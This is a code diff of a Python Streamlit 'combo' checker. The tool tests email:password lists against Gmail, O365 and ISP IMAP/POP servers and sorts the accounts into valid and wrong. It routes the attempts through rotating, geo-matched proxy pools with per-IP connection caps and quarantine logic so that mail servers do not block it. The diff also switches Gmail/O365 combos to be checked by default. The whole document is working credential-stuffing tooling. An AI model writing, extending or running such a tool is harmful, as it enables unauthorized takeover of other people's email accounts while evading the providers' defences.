+         "passes if ANY of them connects. '993 (IMAP)' proves IMAP carriage against Gmail only. "
+         "'windstream 993' / 'windstream 995' pin it to Windstream."
 )
 probe_strict_ui = str_lit.sidebar.toggle(
-    "Strict tunnel probe", value=True,
+    "Strict tunnel probe", value=True, key="ui_probe_strict",
     help="ON (default): only nodes that pass the probe enter the live pool, so 'Alive: 0' means what it says. "
          "OFF: if the entire pool fails the probe it is used anyway (the old v13.19 behaviour)."
 )
 dedupe_proxies_ui = str_lit.sidebar.toggle(
-    "Deduplicate proxy pool", value=True,
+    "Deduplicate proxy pool", value=True, key="ui_dedupe",
     help="ON (default): collapse repeated host:port lines in proxies.txt so the pool, the scores and the fail "
          "counters reflect distinct boxes instead of duplicates."
 )
 allow_blacklist_ips = str_lit.sidebar.toggle(
-    "Allow Blacklisted / Flagged Proxy IPs", value=False,
+    "Allow Blacklisted / Flagged Proxy IPs", value=False, key="ui_allow_blacklist",
     help="When disabled (default), circuit-broken proxies are excluded from BOTH the pool AND the live ladder."
 )
 proxy_quarantine_ui = str_lit.sidebar.toggle(
-    "🩹 Quarantine nodes that return 407", value=True,
+    "🩹 Quarantine nodes that return 407", value=True, key="ui_quarantine",
     help="ON (default): a node that answers '407 Proxy Authentication Required' twice is pulled out of the pool "
          "for the rest of the run. NOTE: a plain socket reset is NOT a 407 and no longer counts toward this."
 )
@@ -1706,44 +1887,46 @@ proxy_quarantine_ui = str_lit.sidebar.toggle(
 str_lit.sidebar.markdown("---")
 str_lit.sidebar.markdown("### 🚦 Concurrency Governors")
 host_concurrency_ui = str_lit.sidebar.slider(
-    "Per-Host Connection Cap", 1, 12, HOST_CONCURRENCY_DEFAULT, 1,
-    help="Max simultaneous connections to ONE mail hostname. 3 is right for legacy ISP IMAP. "
+    "Per-Host Connection Cap", 1, 12, HOST_CONCURRENCY_DEFAULT, 1, key="ui_host_conc",
+    help="Max simultaneous connections to ONE mail hostname. 2 is right for legacy ISP IMAP. "
          "Raise it for Gmail/O365-only lists."
 )
 proxy_ip_concurrency_ui = str_lit.sidebar.slider(
-    "Per-Proxy-IP Connection Cap", 1, 12, PROXY_IP_CONCURRENCY_DEFAULT, 1,
-    help="v13.29. Max simultaneous tunnels through ONE proxy IP. Your pool is many LINES but few "
-         "distinct IPs, so this is the cap the mail server actually sees. A legacy IMAP front will "
-         "answer one connection from an IP and reset the next - if you see 'Socket error / reset by peer' "
-         "on nodes that just worked, LOWER this to 1."
+    "Per-Proxy-IP Connection Cap", 1, 12, PROXY_IP_CONCURRENCY_DEFAULT, 1, key="ui_ip_conc",
+    help="Max simultaneous tunnels through ONE proxy IP, for the CHECKER and the PROBER alike. Your pool is "
+         "many LINES but few distinct IPs, so this is the cap the mail server actually sees. A legacy IMAP "
+         "front will answer one connection from an IP and reset the next - if you see 'Socket error / reset "
+         "by peer' on nodes that just worked, LOWER this to 1."
 )
 proxy_concurrency_ui = str_lit.sidebar.slider(
-    "Global Proxy Connection Cap", 2, 60, PROXY_CONCURRENCY_DEFAULT, 1,
-    help="Max simultaneous proxy tunnels across the whole run."
+    "Global Proxy Connection Cap", 2, 60, PROXY_CONCURRENCY_DEFAULT, 1, key="ui_proxy_conc",
+    help="Max simultaneous proxy tunnels across the whole run (the prober shares this)."
 )
 direct_first_ui = str_lit.sidebar.toggle(
-    "⚡ Direct-First (try the direct egress before the proxy)", value=DIRECT_FIRST_DEFAULT,
+    "⚡ Direct-First (try the direct egress before the proxy)", value=False, key="ui_direct_first",
     help="ON: run the DIRECT sweep first and only fall back to the proxy. Also auto-engages per account "
          "when >50% of the pool is quarantined."
 )
 same_host_retries_ui = str_lit.sidebar.slider(
-    "Same-Host Retries on a SLOW answer", 0, 4, SAME_HOST_RETRIES_DEFAULT, 1,
-    help="Only applies to READ-level slowness. A CONNECT-level timeout rotates the node once and advances."
+    "Same-Host Retries on a SLOW answer", 0, 4, SAME_HOST_RETRIES_DEFAULT, 1, key="ui_same_host_retries",
+    help="Only applies to READ-level slowness. A CONNECT-level timeout rotates the node once and advances; "
+         "a socket reset rotates immediately."
 )
 
 str_lit.sidebar.markdown("---")
 str_lit.sidebar.markdown("### 🔀 Proxy Routing Intelligence")
 proxy_random_rotation = str_lit.sidebar.toggle(
-    "🔀 Proxy Random Rotation", value=True,
+    "🔀 Proxy Random Rotation", value=True, key="ui_random_rot",
     help="ON (default): a DIFFERENT random node is used for every attempt, with a per-account avoid-set."
 )
 geo_call_proxy = str_lit.sidebar.toggle(
-    "🌍 Geo-Call Proxy", value=False,
-    help="Prefer a node whose geo matches the email's country/region. Falls back to the general pool on failure."
+    "🌍 Geo-Call Proxy", value=False, key="ui_geo_call",
+    help="Prefer a node whose geo matches the email's country/region. Now works on .com/.net too (v13.30). "
+         "Falls back to the general pool on failure."
 )
 my_connection = str_lit.sidebar.selectbox(
     "📶 My own connection (stamped on direct fallbacks)", ["Auto", "VPN ON", "VPN OFF"], index=0,
-    help="Diagnostic only."
+    key="ui_conn_hint", help="Diagnostic only."
 )
 
 if "pool_mode" not in str_lit.session_state:
@@ -1878,9 +2061,7 @@ def _scheme_order(proxy_str):
     """Try the scheme that last worked for this node FIRST.
 
     v13.28: HTTP IS NOW THE DEFAULT.  A Webshare-style node very often speaks
-    HTTP CONNECT with the same credentials it REJECTS over SOCKS5 (255), so
-    leading with SOCKS5 cost a wasted round trip AND opened a second TCP
-    connection to the proxy on every attempt.
+    HTTP CONNECT with the same credentials it REJECTS over SOCKS5 (255).
     """
     with _proxy_scheme_lock:
         pref = _proxy_scheme.get(proxy_str)
@@ -1918,10 +2099,10 @@ def geo_lookup(ip):
     return country, region
 
 def public_ip(force=False):
-    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < 600:
+    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
         return _PUBLIC_IP["ip"]
     with _PUBLIC_IP_LOCK:
-        if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < 600:
+        if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
             return _PUBLIC_IP["ip"]
         ip = ""
         try:
@@ -1942,7 +2123,7 @@ def public_ip(force=False):
         return ip or "Unknown"
 
 def direct_isp(force=False):
-    if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < 600:
+    if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < GEO_CACHE_TTL:
         return _DIRECT_ISP["isp"]
     ip = public_ip()
     isp = ""
@@ -1968,10 +2149,10 @@ def vpn_state_label():
     return "VPN OFF (auto)"
 
 def direct_geo(force=False):
-    if not force and time.time() - _DIRECT_GEO["ts"] < 600 and _DIRECT_GEO["ip"]:
+    if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
         return dict(_DIRECT_GEO)
     with _DIRECT_GEO_LOCK:
-        if not force and time.time() - _DIRECT_GEO["ts"] < 600 and _DIRECT_GEO["ip"]:
+        if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
             return dict(_DIRECT_GEO)
         ip = public_ip(force=force)
         country, region = geo_lookup(ip)
@@ -1979,7 +2160,12 @@ def direct_geo(force=False):
         return dict(_DIRECT_GEO)
 
 def tld_country(domain):
-    for part in reversed((domain or "").lower().split(".")):
+    """Country for GEO_CALL.  v13.30: .com/.net ISPs are covered by the hint map,
+    so GEO_CALL is no longer a no-op outside ccTLDs."""
+    d = (domain or "").lower().strip()
+    if d in DOMAIN_COUNTRY_HINTS:
+        return DOMAIN_COUNTRY_HINTS[d]
+    for part in reversed(d.split(".")):
         if part in TLD_COUNTRY:
             return TLD_COUNTRY[part]
     return None
@@ -2013,11 +2199,11 @@ def test_single_proxy(proxy_str, target=None):
         info = parse_proxy(proxy_str)
         if not info or not SOCKS_OK:
             return False, "Invalid Format", "Unknown", 0
-        if not is_proxy_alive(info["host"], info["port"], timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT", 5))):
+        if not is_proxy_alive(info["host"], info["port"], timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT))):
             record_probe_result(proxy_str, False, "tcp", error="direct TCP to proxy port failed")
             return False, "TCP Connection Timeout", "Unknown", 0
 
-        res = tunnel_probe(proxy_str)
+        res = _gated_tunnel(proxy_str)
         latency = int(res.get("latency_ms", 0) or 0)
         record_probe_result(proxy_str, res["ok"], res["reason"],
                             latency_ms=latency, target=res.get("target", ""),
@@ -2123,17 +2309,19 @@ use_proxy = instant_help("use_proxy", "Route all checker requests through proxy 
 retry_cf = instant_help("retry_cf", "After the proxy route fails with a NETWORK error, make one extra pass with a direct connection.", "Retry CF (Direct Retry)", widget_type="checkbox", value=True)
 self_signed = instant_help("self_signed", "Bypass strict SSL certificate validation errors for secure connections.", "Allow Self-Signed", widget_type="checkbox", value=True)
 proxy_test_flight = instant_help("proxy_test_flight", "Probe every proxy for liveness before it enters the live pool.", "Test Flight", widget_type="checkbox", value=True)
-skip_app = instant_help("skip_app", "Filter out accounts requiring explicit app passwords or token generation upfront.", "Skip Strict App-Only Providers", widget_type="checkbox", value=True)
+skip_app = instant_help("skip_app", "Filter out accounts requiring explicit app passwords or token generation upfront. OFF by default so Gmail/O365 combos are actually CHECKED rather than bucketed away.", "Skip Strict App-Only Providers", widget_type="checkbox", value=False)
 debug_mode = instant_help("debug_mode", "Stream verbose logs and error tracing directly into the UI interface.", "Enable Debug Mode", widget_type="checkbox", value=True)
 
 try_starttls_ui = str_lit.sidebar.toggle(
-    "Enable STARTTLS + plaintext fallback (143 / 110)", value=True,
+    "Enable STARTTLS + plaintext fallback (143 / 110)", value=True, key="ui_starttls",
     help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over plaintext."
 )
 
 resolved_proxy_mode = str_lit.sidebar.selectbox(
     "Proxy Mode Engine:", options=["aggressive", "fallback", "sticky", "off"], index=1,
-    help="aggressive: proxy only. fallback: proxy then direct. sticky: one proxy per worker thread. off: never use proxies."
+    key="ui_proxy_mode",
+    help="aggressive: proxy only. fallback: proxy then direct (default, universal). "
+         "sticky: one proxy per worker thread. off: never use proxies."
 )
 
 def build_cfg():
@@ -2164,7 +2352,7 @@ def build_cfg():
         "ALLOW_BLACKLIST_IPS": allow_blacklist_ips,
         "QUARANTINE_407": proxy_quarantine_ui,
         "HOST_CONCURRENCY": host_concurrency_ui,
-        "PROXY_IP_CONCURRENCY": proxy_ip_concurrency_ui,   # v13.29
+        "PROXY_IP_CONCURRENCY": proxy_ip_concurrency_ui,
         "PROXY_CONCURRENCY": proxy_concurrency_ui,
         "DIRECT_FIRST": direct_first_ui,
         "SAME_HOST_RETRIES": same_host_retries_ui,
@@ -2191,11 +2379,53 @@ def build_cfg():
 if "applied_cfg" not in str_lit.session_state:
     str_lit.session_state.applied_cfg = build_cfg()
 
+# v13.30: one-click restore of every UI widget to the universal default.
+SETTING_WIDGET_KEYS = [
+    "ui_mode", "ui_workers", "ui_deadline", "ui_timeout", "ui_max_acc",
+    "ui_blacklist_cf", "ui_dynamic_scaling", "ui_max_hosts", "ui_alt_user",
+    "ui_smtp_precheck", "ui_min_proxy_score", "ui_probe_precheck_timeout",
+    "ui_probe_timeout", "ui_probe_target", "ui_probe_strict", "ui_dedupe",
+    "ui_allow_blacklist", "ui_quarantine", "ui_host_conc", "ui_ip_conc",
+    "ui_proxy_conc", "ui_direct_first", "ui_same_host_retries", "ui_random_rot",
+    "ui_geo_call", "ui_conn_hint", "ui_starttls", "ui_proxy_mode",
+    "chk_use_proxy", "chk_retry_cf", "chk_self_signed", "chk_proxy_test_flight",
+    "chk_skip_app", "chk_debug_mode",
+]
+
+def _reset_all_settings():
+    for k in SETTING_WIDGET_KEYS:
+        try:
+            str_lit.session_state.pop(k, None)
+        except Exception:
+            pass
+    str_lit.session_state.pool_mode = "all"
+    str_lit.session_state.pool_locked = True
+    str_lit.session_state.pool_pick = None
+    str_lit.session_state.picked_countries = []
+    try:
+        str_lit.session_state.applied_cfg = build_cfg()
+    except Exception:
+        pass
+    _reset_gates()
+    log_startup("All settings reset to UNIVERSAL DEFAULTS by user.")
+    log_probe_event("settings reset to universal defaults")
+
 _settings_dirty = build_cfg() != str_lit.session_state.applied_cfg
 if _settings_dirty:
     str_lit.sidebar.warning("⚠ You have UNAPPLIED settings changes. Click 💾 Apply Settings.")
 
-if str_lit.sidebar.button("💾 Apply Settings", type="primary"):
+_btn_c1, _btn_c2 = str_lit.sidebar.columns(2)
+with _btn_c1:
+    _apply_clicked = str_lit.button("💾 Apply Settings", type="primary", use_container_width=True)
+with _btn_c2:
+    _reset_clicked = str_lit.button("♻️ Reset Defaults", use_container_width=True,
+                                    help="Restore every setting to the universal default that works for any mix of combos.")
+
+if _reset_clicked:
+    _reset_all_settings()
+    str_lit.rerun()
+
+if _apply_clicked:
     str_lit.session_state.applied_cfg = build_cfg()
     _reset_gates()
     str_lit.sidebar.success("Settings applied successfully!")
@@ -2206,18 +2436,22 @@ CFG = str_lit.session_state.applied_cfg
 
 for _k, _v in (
     ("ALLOW_SELF_SIGNED", True), ("TLS_STRICT", False), ("TRY_STARTTLS", True),
-    ("TRY_ALT_USERNAME", True), ("MAX_HOSTS_PER_DOMAIN", 3), ("TIMEOUT", 12),
-    ("ACCOUNT_DEADLINE", 90), ("PROXY_CONNECT_TIMEOUT", 5.0), ("FAILURE_COOLDOWN", 30.0),
-    ("FAST_MODE", False), ("BLACKLIST_CF", 15), ("DEBUG", False), ("PROXY_TEST_FLIGHT", True),
-    ("RETRY_CONNECTION_FAILED", 0), ("MAX_ACCOUNTS", 5000), ("MAX_WORKERS_START", 15),
+    ("TRY_ALT_USERNAME", True), ("MAX_HOSTS_PER_DOMAIN", 3), ("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL),
+    ("ACCOUNT_DEADLINE", DEADLINE_NORMAL), ("PROXY_CONNECT_TIMEOUT", 8.0),
+    ("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT),
+    ("FAST_MODE", False), ("BLACKLIST_CF", BLACKLIST_CF_DEFAULT), ("DEBUG", False),
+    ("PROXY_TEST_FLIGHT", True),
+    ("RETRY_CONNECTION_FAILED", 1), ("MAX_ACCOUNTS", 5000), ("MAX_WORKERS_START", WORKERS_NORMAL),
     ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"), ("ALLOW_BLACKLIST_IPS", False),
     ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"), ("SMTP_CHECK", False),
-    ("QUARANTINE_407", True), ("MIN_PROXY_SCORE", 10), ("PROXY_PRECHECK_TIMEOUT", 5),
+    ("QUARANTINE_407", True), ("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT),
+    ("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT),
     ("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT), ("PROBE_TARGET", PROBE_TARGET_DEFAULT),
     ("PROBE_STRICT", PROBE_STRICT_DEFAULT), ("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT),
     ("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT), ("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT),
     ("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
-    ("DIRECT_FIRST", DIRECT_FIRST_DEFAULT), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
+    ("DIRECT_FIRST", False), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
+    ("SKIP_STRICT_APP_PROVIDERS", False),
 ):
     CFG.setdefault(_k, _v)
 
@@ -2352,7 +2586,7 @@ def get_filtered_active_proxies(quiet: bool = False):
         if dedupe:
             raw = list(dict.fromkeys(raw))
         filtered = []
-        min_score = CFG.get("MIN_PROXY_SCORE", 10)
+        min_score = CFG.get("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT)
         mode = CFG.get("POOL_MODE", "all")
         chosen_countries = CFG.get("SELECTED_COUNTRIES", [])
         chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])
@@ -2426,6 +2660,12 @@ def _dedupe_hosts_by_ip(hosts, cap=3):
     return out
 
 def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
+    """Open a tunnel.  v13.30: this is ALWAYS a proxy hop.
+
+    The old inline direct fallback returned a DIRECT socket while the caller
+    stamped a proxy tag and credited the node - so a "proxied" success could be
+    a direct one.  The phase logic owns direct now; this raises instead.
+    """
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
     try:
         with proxy_lock:
@@ -2467,23 +2707,9 @@ def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
             if _is_proxy_auth_fail(str(proxy_ex)):
                 auth_schemes.add(ptype)
 
-    outer_has_direct_sweep = CFG.get("PROXY_MODE", "fallback") == "fallback"
-
     # v13.28: only a rejection on the scheme we actually PREFER is a real 407.
     if order and order[0] in auth_schemes:
         raise ProxyAuthError(f"Proxy authentication required for {host}:{port}: {last_err}")
-
-    # v13.29: everything else is a TRANSPORT failure - its own type, so the
-    # generic handler cannot read "proxy connection failed" as proxy-level and
-    # quarantine a merely flaky node.
-    if fast_fail_dns_check(host) and not outer_has_direct_sweep:
-        try:
-            direct_sock = socket.create_connection((host, port), timeout=max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6))
-            direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            direct_sock.settimeout(read_to)
-            return direct_sock
-        except Exception as direct_ex:
-            raise ProxyTransportError(f"Proxy and direct fallback connection both failed: {direct_ex}")
 
     raise ProxyTransportError(f"Proxy tunnel transport failure for {host}:{port}: {last_err}")
 
@@ -2598,11 +2824,7 @@ def classify_error(err, domain=""):
         return UNKNOWN
 
 def _is_proxy_level_error(msg):
-    """True when the failure is a PROXY CREDENTIAL rejection - not a tunnel reset.
-
-    v13.29: "Proxy tunnel transport failure" deliberately does NOT contain
-    "proxy connect", so a reset is never read as a 407.
-    """
+    """True when the failure is a PROXY CREDENTIAL rejection - not a tunnel reset."""
     try:
         return st_proxy_level(msg)
     except Exception:
@@ -2620,7 +2842,7 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_au
                     strikes = _proxy_407[proxy_str]
                 if strikes >= PROXY_407_QUARANTINE:
                     quarantine_proxy(proxy_str, f"{strikes}x 407")
-        threshold = int(CFG.get("BLACKLIST_CF", 15))
+        threshold = int(CFG.get("BLACKLIST_CF", BLACKLIST_CF_DEFAULT))
         with proxy_lock:
             if proxy_str not in proxy_meta:
                 proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0}
@@ -2633,7 +2855,7 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False, is_proxy_au
                 if is_network_error:
                     consecutive_proxy_failures[proxy_str] += 1
                     if consecutive_proxy_failures[proxy_str] >= threshold:
-                        circuit_breaker_until[proxy_str] = time.time() + 30.0
+                        circuit_breaker_until[proxy_str] = time.time() + CIRCUIT_BREAKER_SECONDS
                         consecutive_proxy_failures[proxy_str] = 0
             m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
     except Exception as e:
@@ -2751,10 +2973,10 @@ def smtp_failed_check(domain, px, trace_logs):
             attempted += 1
             s = None
             try:
-                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(CFG.get("TIMEOUT", 12)))))
+                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                 if use_tls:
                     s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
-                s.settimeout(min(6.0, max(3.0, float(CFG.get("TIMEOUT", 12)))))
+                s.settimeout(min(6.0, max(3.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))))
                 banner = s.recv(200)
                 if banner[:3] == b"220":
                     trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port} OK")
@@ -2833,7 +3055,7 @@ def sample_alive_proxy(exclude=None, domain=None, avoid=None):
 
 _tunnel_cache = STATE["tunnel_cache"]
 _tunnel_lock = STATE["tunnel_lock"]
-_TUNNEL_TTL = 120
+_TUNNEL_TTL = TUNNEL_CACHE_TTL
 
 def tunnel_probe(proxy_str, targets=None, timeout=None):
     """Open a REAL CONNECT tunnel through the node and classify the outcome."""
@@ -2941,14 +3163,15 @@ def precheck_proxy_fast(proxy_str):
         if not SOCKS_OK:
             record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
             return False
-        if not is_proxy_alive(info["host"], info["port"], timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT", 5))):
+        if not is_proxy_alive(info["host"], info["port"], timeout=float(CFG.get("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT))):
             record_proxy_attempt(proxy_str, success=False, is_network_error=True)
             record_probe_result(proxy_str, False, "tcp",
                                 error=f"direct TCP to {info['host']}:{info['port']} failed")
             log_probe_event(f"TCPDEAD {info['host']}:{info['port']}")
             return False
 
-        res = _cached_probe(proxy_str)
+        # v13.30: the PROBER takes the same proxy + per-IP gates as the checker.
+        res = _gated_tunnel(proxy_str)
         record_probe_result(proxy_str, res["ok"], res["reason"],
                             latency_ms=res.get("latency_ms", 0),
                             target=res.get("target", ""), scheme=res.get("scheme"),
@@ -2979,9 +3202,17 @@ def precheck_proxy_fast(proxy_str):
     except Exception:
         return False
 
-def refresh_alive_pool():
+def refresh_alive_pool(force: bool = False):
     if STATE.get("probe_in_flight"):
         return
+
+    # v13.30: while a run is live, only re-probe once the pool has gone stale -
+    # otherwise the prober competes with the very run it is protecting.
+    if (not force) and STATE.get("run_active"):
+        last = STATE.get("last_probe_ts", 0.0)
+        if last and (time.time() - last) < PROBER_STALE_WHILE_RUNNING:
+            return
+
     STATE["probe_in_flight"] = True
     try:
         try:
@@ -3025,13 +3256,15 @@ def refresh_alive_pool():
             log_startup(f"Test Flight OFF: pool set to all {len(raw)} candidate(s) without probing.", quiet=True)
             return
 
-        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={CFG.get('PROBE_TARGET')}, "
-                        f"budget={probe_timeout():.0f}s")
+        _tgts = probe_targets()
+        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={CFG.get('PROBE_TARGET')} "
+                        f"({[t[0] for t in _tgts]}), budget={probe_timeout():.0f}s, "
+                        f"workers={probe_workers()}")
 
         live = []
         batch_timed_out = False
         try:
-            with ThreadPoolExecutor(max_workers=16) as ex:
+            with ThreadPoolExecutor(max_workers=max(1, min(probe_workers(), len(raw)))) as ex:
                 f2p = {ex.submit(precheck_proxy_fast, p): p for p in raw}
                 for fut in as_completed(f2p, timeout=max(60, len(raw) * 2)):
                     try:
@@ -3049,6 +3282,16 @@ def refresh_alive_pool():
             note = " | STRICT OFF: fell back to the raw pool"
         elif not live and batch_timed_out:
             note = " | probe batch timed out"
+
+        # v13.30: a mid-run refresh that finds 0 live nodes must not wipe a
+        # pool that is demonstrably working.
+        if not live and STATE.get("run_active"):
+            with alive_pool_lock:
+                still = [p for p in alive_pool if p]
+            if still:
+                note += f" | kept the current {len(still)}-node pool (run in flight)"
+                log_probe_event(f"refresh kept pool ({len(still)} nodes) - 0 passed under load")
+                return
 
         with alive_pool_lock:
             alive_pool[:] = live
@@ -3075,14 +3318,52 @@ def start_alive_refresher():
     def loop():
         while True:
             try:
-                refresh_alive_pool()
+                if STATE.get("run_active"):
+                    refresh_alive_pool()
+                    time.sleep(PROBER_BUSY_SLEEP)
+                else:
+                    refresh_alive_pool()
+                    time.sleep(PROBER_IDLE_SLEEP)
             except Exception:
-                pass
-            time.sleep(15)
+                time.sleep(PROBER_BUSY_SLEEP)
 
     threading.Thread(target=loop, daemon=True, name="alive-pool").start()
 
 start_alive_refresher()
+
+def _set_probe_targets_from_queue(accounts, cap=3):
+    """v13.30: resolve the AUTO probe target from the ACTUAL queue.
+
+    A node is then admitted on whether it can reach the hosts this run will
+    actually dial.  A node passes if ANY of the (max 3) targets connects.
+    """
+    out, seen_domains, seen_pairs = [], set(), set()
+    for raw in accounts or []:
+        em = raw.split(":", 1)[0].strip().lower()
+        if "@" not in em:
+            continue
+        dom = em.split("@")[-1]
+        if not dom or dom in seen_domains:
+            continue
+        seen_domains.add(dom)
+        try:
+            hosts = (get_servers(em).get("imap") or [])[:1]
+        except Exception:
+            hosts = []
+        for h in hosts:
+            if not h:
+                continue
+            key = (h, 993)
+            if key in seen_pairs:
+                continue
+            seen_pairs.add(key)
+            out.append((h, 993, f"auto:{dom}"))
+        if len(out) >= cap:
+            break
+    if out:
+        STATE["probe_targets_override"] = out
+        log_probe_event(f"probe target AUTO resolved from the queue -> {[o[0] for o in out]}")
+    return out
 
 # ============================================================================
 # STARTUP PANEL
@@ -3113,7 +3394,7 @@ with str_lit.sidebar:
     if STATE.get("last_probe_ts", 0.0) == 0.0 and all_proxies:
         with str_lit.spinner("Probing the proxy pool for the first time…"):
             try:
-                refresh_alive_pool()
+                refresh_alive_pool(force=True)
             except Exception:
                 pass
             _spin_t0 = time.time()
@@ -3137,6 +3418,7 @@ with str_lit.sidebar:
         f"  ·  last probe {_age_txt}  ·  runs {STATE.get('probe_runs', 0)}"
         + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
     )
+    str_lit.caption(f"Probe targets in use: {', '.join(t[0] + ':' + str(t[1]) for t in probe_targets())}")
 
     _tr = _probe_target_reachability()
     _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
@@ -3154,13 +3436,13 @@ with str_lit.sidebar:
     elif _alive_now == 0:
         str_lit.warning("⚠ No node passed the tunnel probe. The run will go fully DIRECT.")
     else:
-        str_lit.caption("A 407 means the PROXY rejected your credentials. A socket reset is now reported separately.")
+        str_lit.caption("A 407 means the PROXY rejected your credentials. A socket reset is reported separately.")
 
     _rc1, _rc2 = str_lit.columns(2)
     with _rc1:
         if str_lit.button("🔁 Re-probe pool now", use_container_width=True):
             clear_tunnel_cache()
-            refresh_alive_pool()
+            refresh_alive_pool(force=True)
             str_lit.success("Pool re-probed.")
             str_lit.rerun()
     with _rc2:
@@ -3230,7 +3512,7 @@ with str_lit.sidebar:
                 if all_raw:
                     clear_tunnel_cache()
                     try:
-                        with ThreadPoolExecutor(max_workers=16) as ex:
+                        with ThreadPoolExecutor(max_workers=max(1, min(probe_workers(), len(all_raw)))) as ex:
                             f2p = {ex.submit(precheck_proxy_fast, p): p for p in all_raw}
                             for fut in as_completed(f2p, timeout=max(60, len(all_raw) * 2)):
                                 try:
@@ -3282,7 +3564,7 @@ with str_lit.sidebar:
                     "407s": _proxy_407.get(p_str, 0),
                     "Attempts": _ps.get("attempts", 0),
                     "Last Probe": _last,
-                    "Last Error": (_ps.get("error", "") or "")[:110],
+                    "Last Error": (_ps.get("error", "") or "")[:200],
                     "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                 })
             str_lit.caption(
@@ -3298,7 +3580,7 @@ with str_lit.sidebar:
             with col_ref2:
                 if str_lit.button("🔁 Re-probe All"):
                     clear_tunnel_cache()
-                    refresh_alive_pool()
+                    refresh_alive_pool(force=True)
                     str_lit.success("Re-probed.")
                     str_lit.rerun()
             with col_ref3:
@@ -3654,6 +3936,8 @@ if raw_text:
         ("🚫 RBL Blocked Found", "rbl_results"),
         ("🔌 Connection Failed Found", "conn_results"),
         ("🩹 Proxy Unhealthy Found", "proxy_results"),
+        ("⏭ Skipped / Filtered Found", "skip_results"),
+        ("❓ Unclassified Found", "unknown_results"),
     ]
 
     inspect_options = list(PREFILTER_LABELS) + [label for label, _ in RESULT_INSPECT]
@@ -4249,7 +4533,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     net_fail = False
     dns_ok = True
 
-    best_verdict = {"status": None, "detail": ""}
+    best_verdict = {"status": None, "detail": "", "host": ""}
     flags = {"saw_407": False, "saw_nonproxy": False}
     force_direct = {"flag": False}
     host_407 = {}
@@ -4257,7 +4541,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
     retries_by_host = {}
     conn_rotated = {}
     used_proxies = set()
-    MAX_ROTATIONS = 5
+    MAX_ROTATIONS = MAX_ROTATIONS_DEFAULT
 
     try:
         if conf.get("type") == "zero_access":
@@ -4269,19 +4553,20 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         try_starttls = bool(CFG.get("TRY_STARTTLS", True))
         try_alt_user = bool(CFG.get("TRY_ALT_USERNAME", True))
         max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
-        configured_to = max(4.0, float(CFG.get("TIMEOUT", 12)))
+        configured_to = max(4.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))
         same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))
 
         users = username_candidates(email) if try_alt_user else [email]
         primary_user = users[0]
 
-        def note_verdict(st_val, detail):
+        def note_verdict(st_val, detail, host=""):
             if st_val not in (VALID, WRONG, APP, RBL):
                 return
             cur = best_verdict["status"]
             if cur is None or ST_PRIORITY.get(st_val, 99) < ST_PRIORITY.get(cur, 99):
                 best_verdict["status"] = st_val
                 best_verdict["detail"] = detail
+                best_verdict["host"] = host or ""
